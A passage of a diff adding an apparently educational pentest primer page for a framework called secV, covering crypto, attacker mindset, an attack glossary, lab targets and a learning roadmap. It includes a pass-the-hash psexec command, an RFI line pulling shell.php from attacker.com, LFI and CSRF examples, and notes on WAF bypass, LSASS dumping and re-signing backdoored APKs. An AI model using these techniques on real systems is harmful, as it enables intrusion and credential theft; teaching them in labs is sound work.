+pip3 install --break-system-packages impacket  # Force install on newer Python</pre>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 08: CRYPTOGRAPHY ESSENTIALS -->
+<div class="wrap" id="crypto-basics">
+  <div class="section-label">
+    <span class="section-num">08</span>
+    <span>Cryptography Essentials</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Crypto From <span class="h2-alt">Zero</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    Cryptography appears in every secV module — password hashes in AD attacks, APK signing, TLS in
+    Meterpreter's HTTPS transport, WPA2's 4-way handshake. You don't need to implement crypto, but
+    you need to understand what hashes are, why symmetric and asymmetric encryption differ, and
+    how TLS protects (and doesn't protect) network traffic.
+  </p>
+
+  <h3>Hashing — One-Way Functions</h3>
+  <div class="prereq-grid">
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--green)"></div>What is a Hash?</div>
+      <div style="font-size:.6rem;color:var(--fog);line-height:1.85">
+        A hash function takes any input and produces a fixed-size output. It's one-way:
+        you can't reverse a hash back to the input (mathematically). Same input always produces
+        same output. Different input produces completely different output.
+        <pre class="step-code" style="margin-top:.6rem">sha256("password") = 5e884898da28047151d0e56f8dc6292773603d0d6aabbdde5...
+sha256("Password") = a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e99...
+                     # One capital letter → completely different hash</pre>
+      </div>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--amber)"></div>How Passwords are Stored</div>
+      <ul class="prereq-list">
+        <li>Websites store the <strong>hash</strong> of your password, not the password itself</li>
+        <li>At login: hash your input, compare to stored hash. Never compare plain text.</li>
+        <li><strong>NTLM hash</strong> (Windows AD): MD4(UTF-16LE(password)) — fast to compute, fast to crack</li>
+        <li><strong>bcrypt/scrypt/Argon2</strong> (modern web): intentionally slow — 100ms/hash → brute force impractical</li>
+        <li>WPA2 PMK: PBKDF2(password, SSID, 4096 rounds) — why WiFi cracking needs GPU</li>
+        <li>Cracking = try millions of passwords, hash each, compare to stolen hash</li>
+      </ul>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--red)"></div>Hash in Windows AD</div>
+      <pre class="step-code" style="font-size:.58rem">## NTLM hash format in secretsdump output:
+Administrator:500:LM_HASH:NT_HASH:::
+                   ↑        ↑
+                   │        └─ NT hash (MD4 of UTF-16LE password)
+                   └────────── LM hash (old, often disabled)
+
+## Pass-the-Hash: authenticate with the NT hash directly
+## No need to crack it — Windows NTLM protocol accepts the hash
+python3 psexec.py -hashes :NT_HASH_HERE domain/User@target</pre>
+    </div>
+  </div>
+
+  <h3>Symmetric vs Asymmetric Encryption</h3>
+  <div class="prereq-grid">
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--blue)"></div>Symmetric (AES)</div>
+      <div style="font-size:.6rem;color:var(--fog);line-height:1.85">
+        One key encrypts AND decrypts. Both sides must share the key before communicating.
+        Fast — used to encrypt actual data (files, traffic).<br><br>
+        <strong style="color:var(--ash)">AES-256</strong>: 256-bit key. The most common. Used in WPA2 (CCMP), TLS data encryption, BitLocker, APK signing (after key exchange).
+      </div>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--purple)"></div>Asymmetric (RSA / ECDSA)</div>
+      <div style="font-size:.6rem;color:var(--fog);line-height:1.85">
+        Two mathematically linked keys: a <strong>public key</strong> (share with everyone) and a
+        <strong>private key</strong> (keep secret). Encrypt with public → only private key can decrypt.
+        Sign with private → anyone with public key can verify.<br><br>
+        Used in: TLS certificate exchange, APK signing (Android), SSH key authentication, code signing.
+      </div>
+    </div>
+    <div class="prereq-card">
+      <div class="prereq-card-title"><div class="dot" style="background:var(--green)"></div>TLS / HTTPS</div>
+      <div style="font-size:.6rem;color:var(--fog);line-height:1.85">
+        TLS combines both: asymmetric to <em>exchange</em> a symmetric session key securely, then symmetric to <em>encrypt</em> all data.<br><br>
+        Why Meterpreter HTTPS bypasses firewalls: traffic is valid TLS on port 443. Without decrypting TLS, firewalls see normal HTTPS — they can't inspect the Meterpreter TLV payload inside.
+      </div>
+    </div>
+  </div>
+
+  <h3>Base64 — Encoding vs Encryption</h3>
+  <div style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:.8rem">
+    Base64 is <strong style="color:var(--red)">not encryption</strong> — it's an encoding scheme that
+    converts binary data to printable ASCII characters. Anyone can decode it instantly with no key.
+    It's used to safely carry binary data through text-only channels (email, URLs, XML, PowerShell).
+    badusb uses base64 to embed PowerShell scripts in DuckyScript; Android payloads use it to hide
+    shell commands in APK resource files.
+  </div>
+  <pre class="step-code"># Base64 encode/decode on Linux:
+echo "id; whoami" | base64          # → aWQ7IHdob2FtaQo=
+echo "aWQ7IHdob2FtaQo=" | base64 -d # → id; whoami
+
+# In PowerShell (Windows — badusb uses this):
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("id; whoami"))
+# → Note: PowerShell's -EncodedCommand uses UTF-16LE, not UTF-8
+
+# Detect base64 in the wild: length divisible by 4, only [A-Za-z0-9+/=] chars
+# Always decode suspicious base64 strings you find in web apps, APKs, scripts</pre>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 09: THE HACKER MINDSET -->
+<div class="wrap" id="mindset">
+  <div class="section-label">
+    <span class="section-num">09</span>
+    <span>Attacker's Mindset</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Think Like a <span class="h2-alt">Red Teamer</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    The biggest difference between a script kiddie and a skilled pentester isn't the tools —
+    it's the mental model. Understanding <em>why</em> attacks work makes you effective even when
+    the tools fail, and makes your reports genuinely useful to the defenders.
+  </p>
+
+  <div class="path-grid">
+    <div class="path-step">
+      <div class="path-title" style="color:var(--green)">Attack Surface Thinking</div>
+      <div class="path-desc">Every input is a potential injection point. Every open port is a potential entry. Every trust relationship is a potential lateral movement path. When you look at a system, ask: "what accepts input here, and what happens if that input is malicious?"</div>
+    </div>
+    <div class="path-step">
+      <div class="path-title" style="color:var(--amber)">Assume Breach</div>
+      <div class="path-desc">Real red teams operate on the premise that the perimeter is already compromised. Don't stop at the first shell — go deeper. What can you reach from here? What credentials are in memory? Who else trusts this machine?</div>
+    </div>
+    <div class="path-step">
+      <div class="path-title" style="color:var(--amber)">Least Resistance</div>
+      <div class="path-desc">Attackers don't exploit complex 0-days when a default password works. Always check the easy things first: default credentials, open ADB, unpatched services, misconfigured permissions. 80% of real breaches use known techniques.</div>
+    </div>
+    <div class="path-step">
+      <div class="path-title" style="color:var(--red)">Defense Evasion is Part of the Job</div>
+      <div class="path-desc">A payload that gets caught by AV is a failed operation. Understanding why tools get detected — signatures, behavioral heuristics, EDR hooks — teaches you how to evade them. Every secV module has an OPSEC section for this reason.</div>
+    </div>
+    <div class="path-step">
+      <div class="path-title" style="color:var(--blue)">Read Error Messages</div>
+      <div class="path-desc">Error messages are a pentester's best friend. A verbose error from a web app may leak the database type, version, file paths, and query structure — more useful than a successful response. Never skip reading error output.</div>
+    </div>
+    <div class="path-step">
+      <div class="path-title" style="color:var(--purple)">Document Everything</div>
+      <div class="path-desc">A pentest with no report is just unauthorized hacking. Every finding needs evidence: screenshots, command output, timestamps. secV's structured JSON output is designed to feed directly into professional reports.</div>
+    </div>
+  </div>
+
+  <h3>Understanding Trust Relationships</h3>
+  <pre class="step-code"># Trust is the core concept of all privilege escalation
+
+Web server trusts:  user input in GET/POST parameters
+                    → SQL injection, XSS, command injection
+
+Android trusts:     apps installed with the right signature
+                    → we re-sign a backdoored APK with our cert → Play Protect bypass
+
+Windows AD trusts:  any authenticated domain account for LDAP enumeration
+                    → low-priv user can enumerate entire domain structure
+
+Kerberos trusts:    any account can request a TGS for any SPN
+                    → Kerberoasting: request service ticket, crack it offline
+
+SSH trusts:         key files in ~/.ssh/authorized_keys
+                    → find a private key in a repo/config → ssh as that user
+
+# Every trust relationship is a potential attack path
+# Your job: find the shortest chain of trust relationships to your goal</pre>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 10: EXPANDED GLOSSARY ADDITIONS -->
+<div class="wrap" id="glossary-advanced">
+  <div class="section-label">
+    <span class="section-num">10</span>
+    <span>Advanced Glossary</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Deeper Terms — <span class="h2-alt">Protocol &amp; Tool Level</span></h2>
+
+  <!-- Network Protocol Terms -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--blue)"></div>
+      <span class="gloss-cat-name" style="color:var(--blue)">Network Protocols</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">TCP 3-Way Handshake</div>
+        <div class="gloss-def">The connection setup protocol: Client sends <code>SYN</code> → Server replies <code>SYN-ACK</code> → Client replies <code>ACK</code>. nmap SYN scan (<code>-sS</code>) only sends SYN — a port is open if it receives SYN-ACK, filtered if it receives nothing, closed if it receives RST.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">DNS <span class="gloss-abbr">(Domain Name System)</span></div>
+        <div class="gloss-def">Translates domain names (google.com) to IP addresses. Port 53 (UDP/TCP). Attackers use DNS as a C2 channel (DNS tunneling) since most firewalls allow outbound DNS. Out-of-band SQLi can exfiltrate data via crafted DNS queries.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">DHCP <span class="gloss-abbr">(Dynamic Host Configuration)</span></div>
+        <div class="gloss-def">Automatically assigns IP addresses to devices on a network. Port 67/68 (UDP). Rogue DHCP server attack: attacker's server responds faster than the real one, assigns victim a "default gateway" pointing to attacker → MITM all traffic.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">ARP <span class="gloss-abbr">(Address Resolution Protocol)</span></div>
+        <div class="gloss-def">Maps IP addresses to MAC addresses on a LAN. ARP has no authentication — ARP poisoning (spoofing) lets an attacker tell a victim "I am the router" to intercept traffic. Used in wifi_monitor's MITM mode.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">ICMP <span class="gloss-abbr">(Ping Protocol)</span></div>
+        <div class="gloss-def">Used to test connectivity (<code>ping</code>). Type 8 = echo request (ping), Type 0 = echo reply (pong). ICMP tunneling can carry data inside ping packets, bypassing firewalls that allow ICMP but block TCP/UDP.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">TTL <span class="gloss-abbr">(Time To Live)</span></div>
+        <div class="gloss-def">A counter in IP packets that decrements at each router hop. When TTL=0, the packet is dropped. Default: Linux = 64, Windows = 128, Cisco = 255. A response with TTL=127 → originated from a Windows machine (128-1=127 after one hop).</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Binary Exploitation Terms -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--red)"></div>
+      <span class="gloss-cat-name" style="color:var(--red)">Binary Exploitation</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Buffer Overflow</div>
+        <div class="gloss-def">Writing more data into a fixed-size memory buffer than it can hold, overwriting adjacent memory. Classic attack: overwrite the return address on the stack to redirect execution to attacker-controlled code (shellcode). ctfpwn's stack_smash operation automates this.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">ROP Chain <span class="gloss-abbr">(Return-Oriented Programming)</span></div>
+        <div class="gloss-def">An exploitation technique that chains together existing code fragments ("gadgets") in a program to execute arbitrary operations, bypassing no-execute (NX/DEP) protections that prevent shellcode execution. ctfpwn's rop_build operation builds these automatically.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">ASLR <span class="gloss-abbr">(Address Space Layout Randomization)</span></div>
+        <div class="gloss-def">OS protection that randomizes where code, stack, and heap load in memory at each execution. Makes it harder to target fixed memory addresses in exploits. Bypassed via information leaks, brute force (32-bit), or format string vulnerabilities.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Shellcode</div>
+        <div class="gloss-def">A small sequence of machine code (assembly language compiled to raw bytes) designed to spawn a shell when executed. Must be position-independent (no hardcoded addresses). Meterpreter's stager IS shellcode — it runs in memory, loads Stage 1, establishes C2.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Format String Vulnerability</div>
+        <div class="gloss-def">When user input is passed directly as a printf format string: <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code>. Input like <code>%x %x %x</code> leaks stack memory. <code>%n</code> writes to memory. Still found in embedded firmware and IoT devices.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">PIE <span class="gloss-abbr">(Position Independent Executable)</span></div>
+        <div class="gloss-def">When an executable is compiled as PIE, it can load at any base address (works with ASLR). Non-PIE binaries always load at a fixed address, making exploitation easier since you know where code is. <code>checksec ./binary</code> shows if PIE is enabled.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Web Security Terms -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--amber)"></div>
+      <span class="gloss-cat-name" style="color:var(--amber)">Web Security</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Same-Origin Policy (SOP)</div>
+        <div class="gloss-def">A browser security rule: JavaScript on site A cannot read responses from site B. An XSS payload runs <em>within</em> site A's origin, so it CAN read site A's cookies, DOM, and make authenticated requests to site A's API. That's why XSS is so dangerous.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">CSRF <span class="gloss-abbr">(Cross-Site Request Forgery)</span></div>
+        <div class="gloss-def">Tricks a victim's browser into making an authenticated request to a site where they're logged in. Example: victim visits attacker's page which has <code>&lt;img src="bank.com/transfer?to=attacker&amount=1000"&gt;</code> — browser sends the request with the victim's session cookie.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">SSRF <span class="gloss-abbr">(Server-Side Request Forgery)</span></div>
+        <div class="gloss-def">An attack where you make a <em>server</em> fetch a URL you specify. If the server can reach internal services (metadata APIs, databases, admin panels), you use SSRF to access them from the server's internal perspective. websec's ssrf operation tests for this.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">WAF <span class="gloss-abbr">(Web Application Firewall)</span></div>
+        <div class="gloss-def">A reverse proxy that inspects HTTP traffic for attack patterns. Blocks requests containing obvious SQLi/XSS payloads. Bypassed by encoding (<code>%27</code> instead of <code>'</code>), case variation (<code>SeLeCt</code>), comment injection (<code>SE/**/LECT</code>), and HTTP parameter pollution. websec's waf_evasion mode applies these.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">LFI / RFI <span class="gloss-abbr">(Local/Remote File Inclusion)</span></div>
+        <div class="gloss-def">Vulnerabilities in PHP where user-controlled file paths are passed to <code>include()</code>. LFI: read local files (<code>?page=../../etc/passwd</code>). RFI: include a remote URL containing attacker's PHP code (<code>?page=http://attacker.com/shell.php</code>) — instant RCE if <code>allow_url_include</code> is on.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">IDOR <span class="gloss-abbr">(Insecure Direct Object Reference)</span></div>
+        <div class="gloss-def">Accessing resources by guessing/changing an ID parameter without authorization checks. <code>/api/users/123/data</code> → try <code>/api/users/1/data</code> (admin?). websec's idor_test operation increments/decrements IDs to find unauthorized access. One of the most common bug bounty findings.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Windows / AD Terms -->
+  <div class="gloss-section">
+    <div class="gloss-cat-header">
+      <div class="gloss-cat-dot" style="background:var(--purple)"></div>
+      <span class="gloss-cat-name" style="color:var(--purple)">Windows / Active Directory</span>
+    </div>
+    <div class="gloss-grid">
+      <div class="gloss-card">
+        <div class="gloss-term">Domain Controller <span class="gloss-abbr">(DC)</span></div>
+        <div class="gloss-def">The Windows server that runs Active Directory. Stores all user accounts, passwords (as hashes), group memberships, and policies for the entire domain. Owning a DC = owning the entire organization. DCSync attack extracts all credentials from the DC without touching disk.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Kerberos Ticket <span class="gloss-abbr">(TGT / TGS)</span></div>
+        <div class="gloss-def"><strong>TGT</strong> (Ticket-Granting Ticket): proof that you authenticated. Valid 10 hours by default. <strong>TGS</strong> (Ticket-Granting Service): a ticket for a specific service, encrypted with that service's key — this is what Kerberoasting steals. <strong>Golden Ticket</strong>: forged TGT using krbtgt hash — valid forever.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">DCSync</div>
+        <div class="gloss-def">An attack that replicates Active Directory credential data without touching the DC's files. Uses legitimate AD replication protocol (DS-Replication-Get-Changes-All permission). impacket's secretsdump.py implements this. Requires Domain Admin or replication permissions.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">LSASS <span class="gloss-abbr">(Local Security Authority)</span></div>
+        <div class="gloss-def">Windows process that handles authentication. Keeps copies of recently used credentials in memory — NTLM hashes, Kerberos tickets, and on older systems, plaintext passwords (WDigest). Dumping LSASS (via ProcDump, Task Manager, or Mimikatz) extracts these credentials.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">ACL <span class="gloss-abbr">(Access Control List)</span></div>
+        <div class="gloss-def">Permissions on AD objects. GenericAll = full control. WriteDACL = can modify permissions. WriteOwner = can take ownership. GenericWrite = can write any attribute. BloodHound maps ACL relationships — a chain of ACLs is often the path from a low-priv user to Domain Admin.</div>
+      </div>
+      <div class="gloss-card">
+        <div class="gloss-term">Lateral Movement</div>
+        <div class="gloss-def">Moving from a compromised machine to other machines in the network using valid credentials, tickets, or protocol exploitation. Tools: PsExec (SMB), WMI, WinRM (PowerShell Remoting), RDP, DCOM. windowsAD's shell operation implements PsExec-style lateral movement.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 11: STUDY RESOURCES -->
+<div class="wrap" id="resources">
+  <div class="section-label">
+    <span class="section-num">11</span>
+    <span>Study Resources</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>Where to <span class="h2-alt">Go Deeper</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    secV is a framework for applying knowledge, not a substitute for it. These resources build
+    the conceptual foundation you need to understand <em>why</em> the tools work — making you
+    effective even when the automation fails. Ordered by cost (free first).
+  </p>
+
+  <!-- FREE PLATFORMS -->
+  <h3>Free Practice Platforms</h3>
+  <div class="gloss-grid" style="margin-bottom:2rem">
+    <div class="gloss-card">
+      <div class="gloss-term">PortSwigger Web Security Academy</div>
+      <div class="gloss-def"><strong style="color:var(--green)">portswigger.net/web-security</strong> — The best free web security course online. 100+ interactive labs covering SQLi, XSS, SSRF, XXE, CSRF, IDOR, deserialization, and more. Use websec against the lab URLs. No account required for most labs.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">TryHackMe</div>
+      <div class="gloss-def"><strong style="color:var(--green)">tryhackme.com</strong> — Browser-based labs with guided rooms for every security topic. Free tier gives access to most content. Start with: "Pre-Security" → "Introduction to Cybersecurity" → "Jr Penetration Tester" path.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">HackTheBox</div>
+      <div class="gloss-def"><strong style="color:var(--green)">hackthebox.com</strong> — Harder than TryHackMe, closer to real engagement experience. Free tier includes some machines. The Academy section has structured courses. Filter machines by OS and difficulty. Read write-ups after solving (or failing).</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Metasploit Unleashed</div>
+      <div class="gloss-def"><strong style="color:var(--green)">offensive-security.com/metasploit-unleashed</strong> — Free Metasploit course by Offensive Security. Covers the framework secV's revshell and android_pentest modules use for payload generation and handlers.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">OWASP</div>
+      <div class="gloss-def"><strong style="color:var(--green)">owasp.org</strong> — The Open Web Application Security Project. Free resources: OWASP Top 10, Testing Guide, Mobile Security Testing Guide (MASTG). The MASTG is the companion reading for android_pentest and ios_pentest.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">GTFOBins / LOLBAS</div>
+      <div class="gloss-def"><strong style="color:var(--green)">gtfobins.github.io</strong> (Linux) and <strong style="color:var(--green)">lolbas-project.github.io</strong> (Windows) — Living Off The Land references. Which binaries already on a system can spawn shells, read files, or escalate privileges. Essential post-exploitation reference.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">PayloadsAllTheThings</div>
+      <div class="gloss-def"><strong style="color:var(--green)">github.com/swisskyrepo/PayloadsAllTheThings</strong> — Massive collection of payloads for SQLi, XSS, command injection, file inclusion, SSRF, etc. Reference when websec's built-in payloads don't work — try the next one in the list.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">HackTricks</div>
+      <div class="gloss-def"><strong style="color:var(--green)">book.hacktricks.xyz</strong> — Cheatsheets for exploiting every protocol, service, and vulnerability type. Port-by-port exploitation guide, AD attack chains, Linux/Windows privilege escalation. The reference you have open while running secV.</div>
+    </div>
+  </div>
+
+  <!-- FREE VULNERABLE APPS FOR LAB -->
+  <h3>Free Vulnerable Apps (Your Lab Targets)</h3>
+  <div class="qs-table-wrap">
+  <table class="qs-table">
+    <thead>
+      <tr><th>App / Lab</th><th>Type</th><th>Setup</th><th>Best for practicing</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>DVWA <span class="gloss-abbr">Damn Vulnerable Web App</span></td>
+        <td>Web</td>
+        <td><code>docker run -p 80:80 vulnerables/web-dvwa</code></td>
+        <td>websec — SQLi, XSS, file upload, command injection at 4 difficulty levels</td>
+      </tr>
+      <tr>
+        <td>Metasploitable 2/3</td>
+        <td>Linux VM</td>
+        <td>Download from vulnhub.com, import into VirtualBox/KVM</td>
+        <td>netrecon, revshell — vsftpd exploit, Samba, UnrealIRCd, dozens of vulns</td>
+      </tr>
+      <tr>
+        <td>GOAD (Game of Active Directory)</td>
+        <td>Windows AD</td>
+        <td>github.com/Orange-Cyberdefense/GOAD — Vagrant + VirtualBox</td>
+        <td>windowsAD, adsec — full vulnerable AD forest with multiple DCs</td>
+      </tr>
+      <tr>
+        <td>InsecureBankv2</td>
+        <td>Android APK</td>
+        <td>github.com/dineshshetty/Android-InsecureBankv2</td>
+        <td>android_pentest — exported activities, SQLite injection, weak crypto</td>
+      </tr>
+      <tr>
+        <td>DIVA Android</td>
+        <td>Android APK</td>
+        <td>github.com/payatu/diva-android</td>
+        <td>android_pentest — 13 vulnerability challenges with hints</td>
+      </tr>
+      <tr>
+        <td>OWASP WebGoat</td>
+        <td>Web</td>
+        <td><code>docker run -p 8080:8080 webgoat/webgoat</code></td>
+        <td>websec — explains each vuln then lets you exploit it</td>
+      </tr>
+      <tr>
+        <td>VulnHub</td>
+        <td>VM collection</td>
+        <td>vulnhub.com — download any VM, import into local hypervisor</td>
+        <td>All modules — community-built vulnerable VMs from beginner to expert</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+  <!-- BOOKS -->
+  <h3 style="margin-top:2rem">Books — Deep Knowledge</h3>
+  <div class="gloss-grid" style="margin-bottom:2rem">
+    <div class="gloss-card">
+      <div class="gloss-term">The Web Application Hacker's Handbook</div>
+      <div class="gloss-def">Stuttard &amp; Pinto (Wiley) — Intermediate. Comprehensive web vuln reference. Chapters 9 (SQLi) and 12 (XSS) are still the best explanations anywhere. Read before advanced websec operations.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Penetration Testing</div>
+      <div class="gloss-def">Georgia Weidman (No Starch) — Beginner-Intermediate. Full pentest methodology using Metasploit, Wireshark, and manual exploitation. The closest thing to a textbook companion for secV's workflow.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Android Security Internals</div>
+      <div class="gloss-def">Nikolay Elenkov (No Starch) — Intermediate. The definitive Android security reference: sandboxing, permissions, cryptography, keystore, Binder IPC. Read chapters 1–5 before advanced android_pentest operations.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">The Hacker Playbook 3</div>
+      <div class="gloss-def">Peter Kim (Secure Planet) — Intermediate-Advanced. Red team techniques: C2, evasion, AD lateral movement, custom tooling. Covers the strategy behind what secV's AD modules implement.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Real-World Bug Hunting</div>
+      <div class="gloss-def">Peter Yaworski (No Starch) — Beginner. Real bug bounty writeups for each vulnerability class. Shows how websec findings translate into report-quality documentation.</div>
+    </div>
+    <div class="gloss-card">
+      <div class="gloss-term">Black Hat Python</div>
+      <div class="gloss-def">Seitz &amp; Arnold (No Starch) — Intermediate. Build your own network tools, shells, and scanners in Python. Directly applicable to extending any secV module (all modules are Python).</div>
+    </div>
+  </div>
+
+  <!-- CERTIFICATIONS -->
+  <h3>Certifications — Structured Learning</h3>
+  <div class="qs-table-wrap">
+  <table class="qs-table">
+    <thead>
+      <tr><th>Certification</th><th>Level</th><th>Cost</th><th>Best for</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>eJPT (eLearnSecurity Junior Penetration Tester)</td>
+        <td>Beginner</td>
+        <td>~$200</td>
+        <td>First hands-on cert. Covers network scanning, web vulns, basics — all secV foundations.</td>
+      </tr>
+      <tr>
+        <td>PNPT (Practical Network Penetration Tester)</td>
+        <td>Intermediate</td>
+        <td>~$400</td>
+        <td>TCM Security. Full pentest lab exam — network recon → AD exploitation. Direct secV workflow.</td>
+      </tr>
+      <tr>
+        <td>OSCP (PEN-200)</td>
+        <td>Intermediate-Advanced</td>
+        <td>~$1500</td>
+        <td>Industry-recognized. Lab-based exam, 24h. The gold standard for pentesting certifications.</td>
+      </tr>
+      <tr>
+        <td>CRTP (Certified Red Team Professional)</td>
+        <td>Intermediate</td>
+        <td>~$400</td>
+        <td>PentesterAcademy. Focuses on Active Directory attacks — directly applies to windowsAD module.</td>
+      </tr>
+      <tr>
+        <td>eMAPT (eLearnSecurity Mobile Application Penetration Tester)</td>
+        <td>Intermediate</td>
+        <td>~$400</td>
+        <td>Android and iOS app pentesting methodology — direct companion to android_pentest module.</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="warn-box" style="margin-top:2rem">
+    <strong>Recommendation:</strong> Don't chase certifications before building real skills. Complete TryHackMe's Jr Pentester path and root 10 HackTheBox machines first. The cert validates skills — it doesn't replace building them. Use secV on practice labs while you study, not instead of studying.
+  </div>
+</div>
+
+<hr class="rule">
+
+<!-- SECTION 12: WEEK-BY-WEEK LEARNING PLAN -->
+<div class="wrap" id="roadmap">
+  <div class="section-label">
+    <span class="section-num">12</span>
+    <span>Your Roadmap</span>
+    <span class="section-line"></span>
+  </div>
+  <h2>12-Week <span class="h2-alt">Learning Roadmap</span></h2>
+  <p style="font-size:.7rem;color:var(--fog);max-width:700px;line-height:1.9;margin-bottom:2rem">
+    Follow this plan to go from complete beginner to confidently using every secV module.
+    Each week combines reading, lab practice, and secV usage — reinforcing knowledge through the tool.
+  </p>
+
+  <ul class="steps">
+    <li class="step-item">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-title">Foundations Week 1 — Environment + Networking</div>
+        <div class="step-body">Read this entire foundations page. Set up your lab (lab-setup.html). Read sections 05–07 here (Networking, Attack Lifecycle, Linux). Complete TryHackMe "Pre-Security" path (free, ~6 hours).</div>
+        <pre class="step-code">Lab: secV → use netrecon → set target 127.0.0.1 → run
+Learn: read every line of nmap output. Look up every port you don't recognize.</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-title">Foundations Week 2 — Web Basics</div>
+        <div class="step-body">Read section 08 (Crypto). Start PortSwigger "Server-side topics" → SQLi labs (first 5). Set up DVWA in Docker.</div>
+        <pre class="step-code">Lab: secV → use websec → set target http://localhost → run
+Learn: compare secV's SQLi findings against DVWA's "View Source" for that challenge</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-title">Network Recon Mastery</div>
+        <div class="step-body">Read netrecon internals section. Study nmap's book chapters 1–5 (free online). Install Metasploitable 2 VM.</div>
+        <pre class="step-code">Lab: secV → use netrecon → set target &lt;metasploitable_ip&gt; → run
+Goal: find vsftpd 2.3.4 in netrecon output → understand the CVE</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-title">Your First Shell</div>
+        <div class="step-body">Read revshell internals. Complete TryHackMe "What the Shell?" room. Study Metasploit Unleashed (free).</div>
+        <pre class="step-code">Lab: Metasploitable 2 → vsftpd exploit → catch shell with secV revshell
+Then: upgrade raw shell → Meterpreter (shell_to_meterpreter)</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-title">Web Exploitation</div>
+        <div class="step-body">Complete PortSwigger SQLi labs 1–15. Read websec SQLi + XSS sections. Start bug bounty recon on a program you're eligible for.</div>
+        <pre class="step-code">Lab: websec → sqli, xss_scan, dirb against DVWA
+Deep: manually replicate what websec found using curl commands</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">6</div>
+      <div class="step-content">
+        <div class="step-title">Android Security</div>
+        <div class="step-body">Read android_pentest full page — all architecture sections. Install InsecureBankv2 on Android-x86 VM. Read OWASP MASTG Android chapter 1–3.</div>
+        <pre class="step-code">Lab: android_pentest recon → app_scan → understand every finding
+Deep: jadx decompile InsecureBankv2 → find the hardcoded credentials manually</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">7</div>
+      <div class="step-content">
+        <div class="step-title">Payload Delivery</div>
